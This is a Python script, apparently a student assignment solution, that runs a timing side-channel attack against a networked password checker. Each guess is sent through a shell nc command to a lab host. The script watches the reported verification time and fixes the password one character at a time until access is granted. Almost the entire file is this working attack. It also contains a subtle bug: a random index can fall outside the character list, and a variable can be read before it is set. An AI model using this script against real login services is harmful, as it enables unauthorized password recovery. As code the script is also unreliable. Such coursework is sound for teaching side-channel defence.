'''
Authors: Surya Prasad S (EE19B121), Sai Dheeraj Ettamsetty (CS18B055)
File description: Python code to performing timing analysis of the given password checker and identify the password
'''

import os
import random
import time

start = time.time()
prime = 19
s = "abcdefghijklmnopqrstuvwxyz{}=_"
given_chars = list(s)
random.shuffle(given_chars)
print(len(s))

pwd_guess = ''
for i in range(prime):
    pwd_guess = pwd_guess + given_chars[random.randint(0, 30)]

pwd_found = False

for i in range(prime):  # max 19 times
    print("Current guess:", pwd_guess)

    random.shuffle(given_chars)
    pos = (7*i+4)%prime
    print("Attempting identification of position no.", pos)

    for j in range(len(given_chars)):   # max 30 times
        bashcmd = f"echo \"{pwd_guess}\" | nc 10.21.235.179 5555 > output.txt"

        os.system(bashcmd)

        with open('output.txt', 'r') as f:
            for line in f:
                if "Time taken to verify" in line:
                    runtime = int(float(line.split()[-1]))
                    
                if "Access Granted" in line:
                    print("Password identified!")
                    pwd_found = True

            if pwd_found:
                break
            if runtime == i+1:
                pwd_guess = pwd_guess[:pos] + given_chars[j] + pwd_guess[pos+1:]
            else:
                break

    if pwd_found:
        break

print("Password is", pwd_guess)
end = time.time()
print(f"Total Time taken: {end - start}")
